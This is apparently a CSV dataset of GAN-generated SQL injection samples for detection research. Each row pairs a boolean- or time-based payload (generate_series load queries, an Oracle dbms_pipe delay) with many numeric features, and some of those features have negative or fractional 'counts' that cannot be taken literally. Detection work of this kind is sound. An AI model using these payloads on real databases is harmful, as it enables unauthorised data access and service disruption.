id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000109,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.5310591610360387,134.31405639648438,42.366119384765625,17.096057891845703,44.48499298095703,0.0041214656084775925,52.489524841308594,23.216344833374023,1.0055781602859497,0.29917800426483154,0.1602083146572113,0.3645395338535309,0.1397772580385208,3.6330621242523193,1.03069007396698,0.8166965842247009,1.0501887798309326,0.02144099958240986,0.07024383544921875,0.011199217289686203,4.636318683624268,4.457308769226074,1.6058613061904907,0.025684140622615814,1.525611400604248,0.18844130635261536,0.008406451903283596,0.1627151221036911,0.5884962677955627,0.520927369594574,0.01763792894780636,-0.1120544970035553,0.0324978232383728,0.017100227996706963,0.47405970096588135,1.6997337341308594,3.432295560836792,0.680880606174469,0.5960371494293213,-0.12137047946453094,0.4208879768848419,0.4773513078689575,0.038668978959321976,-0.13045990467071533,0.08979082107543945,-0.037887610495090485,-0.20024392008781433,0.09828710556030273,0.13517038524150848,0.14449167251586914,0.008011743426322937,0.0736854150891304,-0.1623181700706482,0.07217303663492203,0.05392763391137123,-0.15781672298908234,-0.007239149417728186,0.1599014550447464,0.018525511026382446,0.2151617705821991,0.027647212147712708,0.044613681733608246,-0.06823252886533737,1.8836379051208496,0.20874276757240295,0.041993848979473114,0.002298294333741069,0.05715858191251755,0.04391363263130188,-0.014487721025943756,0.013447288423776627,-0.14850935339927673,0.06857604533433914,0.010145188309252262,0.14394928514957428,0.0226413793861866,0.923640251159668,0.4567645788192749,-0.06675223261117935,0.08132049441337585,0.06443168222904205,4.866302490234375,0.9870437979698181,0.1802382618188858,-0.04284004867076874,0.10015159100294113,-0.041687820106744766,0.10001479089260101,0.007444052491337061
GAN_000110,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.741485992479287,123.70932006835938,36.33329391479492,14.746686935424805,44.50299835205078,0.017293956130743027,66.32098388671875,25.93897819519043,0.7174487113952637,0.2620609402656555,0.15638789534568787,0.3642822802066803,0.13748909533023834,3.6941239833831787,0.7659513354301453,1.120630145072937,0.9898340106010437,0.0010724612511694431,0.09857669472694397,0.00540144182741642,4.4544219970703125,4.813249111175537,1.3425424098968506,0.033415090292692184,1.437626838684082,0.30289173126220703,0.0010291164508089423,-0.04563961550593376,0.5422027707099915,0.5783941149711609,0.014195633120834827,-0.17217454314231873,0.042185548692941666,-0.017595402896404266,0.5555663108825684,1.5832977294921875,2.910188913345337,0.6682440638542175,0.54093337059021,-0.18585893511772156,0.5241063833236694,0.5411463975906372,-0.03720254451036453,-0.1316082775592804,0.25704216957092285,-0.07673216611146927,-0.06174756586551666,0.0934496819972992,0.20314976572990417,0.2543059289455414,-0.02799801528453827,0.03556171804666519,-0.009611725807189941,0.13940966129302979,-0.011536109261214733,-0.27590906620025635,-0.015418633818626404,0.14293251931667328,0.11975802481174469,0.34220317006111145,0.0531173050403595,0.0788964331150055,-0.17347192764282227,1.5998871326446533,0.22094181180000305,0.022207750007510185,-0.027914345264434814,0.3396711051464081,0.12512658536434174,-0.03811158984899521,-0.1813257932662964,-0.10151946544647217,0.20315998792648315,0.011626211926341057,0.1085321307182312,-0.20201535522937775,1.0243568420410156,0.3324391841888428,-0.14167630672454834,0.03226128965616226,0.03584686294198036,4.112582206726074,1.0672672986984253,0.11310645192861557,-0.14196400344371796,0.11060548573732376,0.23749050498008728,0.25250184535980225,0.026920855045318604
GAN_000111,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.6899033271540356,115.384033203125,36.68983840942383,16.863300323486328,49.9466667175293,-0.016195017844438553,59.34003829956055,27.277135848999023,1.1394217014312744,0.2413182407617569,0.17131704092025757,0.35458818078041077,0.1417250782251358,3.6262459754943848,1.2512829303741455,0.8944451212882996,1.1570765972137451,0.07226312160491943,0.036639753729104996,0.026391616091132164,4.416558742523193,3.9760072231292725,1.6642197370529175,0.02169136144220829,1.4608914852142334,0.16834548115730286,-0.019022086635231972,0.05201408639550209,0.23572684824466705,0.6096734404563904,0.028677161782979965,-0.23080888390541077,0.06935814023017883,0.298022985458374,0.5360314249992371,1.6024398803710938,2.3605387210845947,0.3374968469142914,0.48641878366470337,-0.07114661484956741,0.48455920815467834,0.483722060918808,0.18766789138317108,-0.15892010927200317,0.2546045780181885,0.01911941170692444,-0.11032994091510773,0.042538248002529144,0.14796306192874908,0.1893121600151062,-0.11063183844089508,0.10185562074184418,0.08437637239694595,-0.14675773680210114,-0.16528457403182983,-0.24792511761188507,0.0016944314120337367,0.17630279064178467,-0.017618343234062195,0.20294985175132751,-0.05774032697081566,0.14785343408584595,0.032227031886577606,1.9431886672973633,0.07060671597719193,0.04500747099518776,0.000565314490813762,0.09552443772554398,0.07724658399820328,-0.07650922983884811,-0.17251139879226685,-0.23163214325904846,0.041238926351070404,0.031929951161146164,0.06065015494823456,0.174937903881073,1.0275464057922363,0.3216856122016907,-0.3421575725078583,0.06378162652254105,-0.03204288333654404,5.04412317276001,1.0337563753128052,0.288654088973999,-0.4009249806404114,0.03695106506347656,-0.07696846127510071,0.40015071630477905,0.00027927421615459025
GAN_000112,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.632619844630113,137.52978515625,39.87071228027344,17.672359466552734,50.89651107788086,-0.013407004065811634,53.81150817871094,24.61846160888672,1.2222034931182861,0.24266546964645386,0.1679847538471222,0.3740827441215515,0.14350678026676178,3.550504207611084,1.1639537811279297,1.3350456953048706,1.348832130432129,0.07564257085323334,0.06285785138607025,0.016767427325248718,3.4557173252105713,4.35895299911499,1.5263117551803589,0.018903659656643867,1.5147854089736938,0.19464173913002014,-0.006480133626610041,0.04165925458073616,0.5378515124320984,0.5762068033218384,0.02674739807844162,0.026719562709331512,0.03619842976331711,0.2717984914779663,0.5230145454406738,1.5814980268478394,2.2832858562469482,0.42410770058631897,0.5231266021728516,-0.060392603278160095,0.353087455034256,0.47329989075660706,-0.06795020401477814,-0.11403960734605789,0.0802760124206543,-0.0457782968878746,-0.28550249338150024,0.10308034718036652,0.09645934402942657,0.13620306551456451,-0.0722077339887619,0.1437920480966568,-0.12251253426074982,0.18148529529571533,-0.14508439600467682,-0.09447106719017029,0.006014515180140734,0.3195823132991791,0.053192123770713806,-0.15326526761054993,-0.008250661194324493,0.1430627405643463,-0.1661635935306549,1.8548810482025146,0.2271186113357544,0.003677508095279336,0.019193904474377632,0.19575953483581543,0.1937519758939743,0.13356012105941772,-0.0068086907267570496,-0.21476350724697113,-0.0625002533197403,0.04392736777663231,0.3691459000110626,0.23036585748195648,1.0202698707580566,0.3697291910648346,-0.15045905113220215,-0.01906058005988598,0.07573392987251282,4.557896137237549,0.9942337870597839,0.1900954395532608,-0.3693302273750305,0.003578275442123413,0.018679875880479813,0.3023349940776825,-0.013433365151286125
GAN_000113,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.6628071381161273,133.841064453125,42.8272705078125,18.701574325561523,43.20005798339844,0.030549604445695877,52.83174133300781,24.57992935180664,1.393476128578186,0.26678091287612915,0.16579197347164154,0.37650808691978455,0.13759076595306396,3.509430408477783,0.7645372152328491,1.199062466621399,1.4382346868515015,0.0613386370241642,0.084104023873806,-0.0060702054761350155,4.234607219696045,4.343852519989014,1.5387734174728394,0.02723841182887554,1.5627858638763428,0.2783474326133728,0.011250144802033901,0.16858741641044617,0.7957658171653748,0.5103209614753723,0.021232737228274345,-0.03766641020774841,0.06336921453475952,0.19680634140968323,0.5237330794334412,1.7690012454986572,2.515575647354126,0.5723642706871033,0.5524234771728516,-0.15753617882728577,0.4317442774772644,0.3845643699169159,-0.07611969113349915,-0.07078710943460464,0.022241540253162384,-0.07593420892953873,-0.3440189063549042,0.13256540894508362,0.17658844590187073,0.1402626782655716,-0.06255385279655457,0.059910498559474945,-0.37578102946281433,0.22791340947151184,0.028445079922676086,-0.03698873519897461,0.0030305497348308563,0.27958306670188904,-0.009659133851528168,-0.06353949755430222,0.11204761266708374,0.23841911554336548,-0.13354334235191345,1.8267459869384766,0.3449423611164093,0.005707368720322847,0.03270001709461212,-0.06509873270988464,0.1586369425058365,0.03179953247308731,0.07747426629066467,-0.2332628071308136,-0.03916459158062935,0.007921409793198109,0.3988412022590637,0.11820022016763687,0.9603986144065857,0.4305904805660248,0.041913311928510666,0.025415198877453804,-0.15300965309143066,3.9192183017730713,0.9423531293869019,0.25260981917381287,-0.197196364402771,0.11370562016963959,-0.09619218111038208,0.03757220879197121,0.0011060688411816955
GAN_000114,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.5619885153192974,130.18960571289062,40.24336624145508,17.569822311401367,41.21581268310547,0.004057947546243668,56.576908111572266,23.350976943969727,1.047685980796814,0.27566391229629517,0.1636810004711151,0.3632969260215759,0.13753123581409454,3.6570611000061035,1.0543103218078613,0.8568313121795654,0.9827135801315308,0.01564807817339897,0.046165525913238525,0.017241602763533592,4.342373371124268,4.530291557312012,1.4859066009521484,0.018193548545241356,1.548026442527771,0.15995922684669495,0.005978904198855162,0.22382302582263947,0.6547380089759827,0.4968531131744385,0.029643237590789795,-0.11354349553585052,0.04367545247077942,0.13361680507659912,0.46684521436691284,1.6799644231796265,2.6726818084716797,0.6423070430755615,0.5315672755241394,-0.13472038507461548,0.4384663999080658,0.5100867748260498,0.0383499339222908,-0.14514049887657166,0.11332228779792786,-0.014336556196212769,-0.18148112297058105,0.14626860618591309,0.1298188418149948,0.1468428522348404,0.03096124529838562,0.09835314005613327,-0.22829291224479675,0.06463583558797836,0.076728954911232,-0.10278597474098206,-0.0047932579182088375,0.2209029644727707,0.015789732336997986,0.2571319341659546,-0.0026257336139678955,0.1705925017595291,-0.10067511349916458,1.875167965888977,0.2930394113063812,0.04716317728161812,0.00016716479149181396,0.07792022079229355,0.05758611857891083,-0.1473139524459839,-0.0015058591961860657,-0.23873040080070496,0.07549645006656647,0.01167304813861847,0.0777805745601654,0.060600340366363525,0.9169615507125854,0.39169061183929443,-0.20207881927490234,0.042592570185661316,0.028416860848665237,4.337087631225586,0.9786050319671631,0.3110015094280243,-0.145943284034729,0.015881463885307312,-0.10199585556983948,-0.01927279680967331,0.006856953259557486
GAN_000115,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.7138010091968296,111.00138854980469,36.474327087402344,13.77807331085205,43.376773834228516,-0.04660842940211296,59.196372985839844,27.82655143737793,0.963719367980957,0.26756584644317627,0.1796949803829193,0.3744211494922638,0.14030343294143677,3.6224758625030518,0.9158957600593567,1.1321213245391846,1.0738505125045776,0.038883939385414124,0.10168671607971191,0.028560146689414978,4.478114604949951,3.9480509757995605,1.5312004089355469,0.022506868466734886,1.4705013036727905,0.1961117833852768,-0.02548266015946865,-0.10023055970668793,0.1919337660074234,0.606942355632782,0.02146504819393158,-0.11728868633508682,-0.016332458704710007,0.07318415492773056,0.571923017501831,1.6550533771514893,2.626096487045288,0.5848996043205261,0.5639505386352539,0.03890177607536316,0.3963930904865265,0.45450741052627563,-0.1309809386730194,-0.08850810676813126,0.09548820555210114,-0.07368063181638718,-0.11931418627500534,0.11442144215106964,0.1326819360256195,0.18780571222305298,-0.11950798332691193,0.027543962001800537,-0.14554284512996674,0.07871373742818832,-0.11544971168041229,-0.4138389229774475,-0.017808228731155396,0.1338435262441635,0.17261071503162384,0.23821967840194702,0.0032402053475379944,0.0770052969455719,-0.2371867597103119,2.255324363708496,0.20576319098472595,0.013070158660411835,-0.003355779917910695,0.33931440114974976,0.11887574940919876,0.06115558743476868,0.077597476541996,-0.03825237229466438,0.32871338725090027,0.03570716455578804,0.4419387876987457,-0.16562461853027344,1.10953950881958,0.39832603931427,-0.2668033540248871,0.007279456593096256,0.03486991673707962,3.479292869567871,1.0749808549880981,0.2179790735244751,-0.27299606800079346,0.10105442255735397,0.18848440051078796,0.317080557346344,-0.0014287062222138047
GAN_000116,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.699557699517824,127.37858581542969,38.90752029418945,14.672813415527344,42.74333190917969,0.0018682534573599696,60.507930755615234,25.203357696533203,1.026695728302002,0.2688414752483368,0.1742118000984192,0.3629955053329468,0.14040617644786835,3.6321861743927,0.8546682000160217,1.0582867860794067,0.9678671360015869,0.022715620696544647,0.05906486511230469,0.0013014437863603234,4.490326404571533,3.6718878746032715,1.2784143686294556,0.018367459997534752,1.5392640829086304,0.21532706916332245,0.00402086554095149,-0.012810243293642998,0.020507952198386192,0.5993384718894958,0.031317178159952164,-0.17053742706775665,0.023144815117120743,0.003158368170261383,0.49641504883766174,1.6952050924301147,3.0942137241363525,0.5832194089889526,0.5655379891395569,-0.015027906745672226,0.4441513121128082,0.46231329441070557,-0.013229385018348694,-0.10423704236745834,0.20079757273197174,-0.06157105416059494,-0.1837620735168457,0.06747575104236603,0.11143716424703598,0.20232123136520386,-0.0709376186132431,0.060761891305446625,-0.13943178951740265,0.20586130023002625,0.10265328735113144,-0.34657377004623413,-0.0159582681953907,0.05294916406273842,0.25177764892578125,0.3258328437805176,-0.05812884494662285,0.021815627813339233,-0.09418105334043503,1.910634160041809,0.17644275724887848,0.024323126301169395,-0.003368166508153081,0.32937780022621155,0.07975775003433228,-0.030910395085811615,0.041539594531059265,0.0709364265203476,0.22742801904678345,0.026661919429898262,0.40394312143325806,-0.1224585771560669,0.9722234010696411,0.4776992201805115,-0.2456861436367035,0.018675046041607857,0.2087266445159912,4.619081497192383,1.049744963645935,0.3074624538421631,0.08217999339103699,0.0738859474658966,0.08849877119064331,0.27635544538497925,0.014368820004165173
GAN_000117,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.615592317436741,127.0061264038086,48.89289093017578,14.832863807678223,41.1879768371582,0.0030206262599676847,48.49506378173828,25.618846893310547,1.3637511730194092,0.24934183061122894,0.1710984706878662,0.3790501356124878,0.13740013539791107,3.5023255348205566,0.8812382817268372,1.2282763719558716,1.4571832418441772,0.030695674940943718,0.09409569203853607,0.0066916244104504585,4.235083103179932,3.850036859512329,1.5412423610687256,0.01683574542403221,1.4627413749694824,0.1966705024242401,0.008261056616902351,0.052819643169641495,0.7138222455978394,0.5266004204750061,0.02140853926539421,0.06268089264631271,0.04270865023136139,0.3503987789154053,0.6066768765449524,1.5824127197265625,1.915625810623169,0.6289424300193787,0.5378215312957764,-0.11066072434186935,0.40372756123542786,0.40831494331359863,-0.04784248769283295,-0.07105808705091476,-0.04429808259010315,-0.1712036430835724,-0.21693505346775055,0.11414508521556854,0.11322031170129776,0.12903143465518951,-0.12449054419994354,0.06701302528381348,-0.22934159636497498,0.22234481573104858,-0.08272658288478851,-0.17381350696086884,0.006405803840607405,0.1577085703611374,0.11732012033462524,0.05992113798856735,-0.03179948031902313,0.121607705950737,-0.10627829283475876,1.9351965188980103,0.4269680678844452,0.013477399945259094,0.0384058840572834,0.0691363736987114,0.14534588158130646,0.013677425682544708,0.14935186505317688,-0.3917525112628937,-0.04142728075385094,0.0231684111058712,0.37626713514328003,0.010073039680719376,1.0526409149169922,0.40687862038612366,-0.2112707495689392,-0.0731317400932312,-0.035203322768211365,2.8767848014831543,1.0110270977020264,0.20070235431194305,-0.3341801166534424,0.23551809787750244,0.11966811120510101,0.07481768727302551,-0.004637036006897688
GAN_000118,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5679979792133634,125.2120590209961,38.878910064697266,16.23436164855957,46.02676010131836,4.2888168536592275e-05,60.944217681884766,25.081754684448242,1.0040955543518066,0.26615267992019653,0.1546442210674286,0.3561258614063263,0.14106586575508118,3.6571784019470215,1.0178993940353394,1.0368064641952515,1.0816699266433716,0.018196141347289085,0.05397435277700424,0.01067238301038742,4.1127729415893555,4.141719818115234,1.5554956197738647,0.019468896090984344,1.5043388605117798,0.1778169721364975,-0.005179590079933405,0.08278928697109222,0.20544447004795074,0.5790529847145081,0.021891428157687187,-0.19768382608890533,0.0526064969599247,0.12449416518211365,0.508842408657074,1.6590805053710938,2.7215683460235596,0.5196763873100281,0.4956417381763458,-0.10657617449760437,0.42361345887184143,0.5011584758758545,0.07610452175140381,-0.078872449696064,0.18927516043186188,0.04606097936630249,-0.1648692637681961,0.11446424573659897,0.1358514130115509,0.18040481209754944,-0.02279554307460785,0.1035606861114502,-0.11905474960803986,0.018023326992988586,-0.03351845592260361,-0.1961391419172287,-0.006159542594105005,0.09782584756612778,-0.002610139548778534,0.26138630509376526,-0.03352445363998413,0.19987639784812927,-0.09900449961423874,1.8371301889419556,0.16268236935138702,0.021419798955321312,-0.0108035234734416,0.1466028094291687,0.17590278387069702,-0.05278465896844864,-0.040039561688899994,-0.06523030996322632,0.14739415049552917,0.026716383174061775,0.25241920351982117,0.001962471753358841,0.9320108890533447,0.35120609402656555,-0.14929881691932678,0.05401557683944702,0.011686362326145172,4.554390907287598,1.0195529460906982,0.26941242814064026,-0.21309810876846313,0.11349993199110031,0.009762786328792572,0.27735471725463867,0.014478402212262154
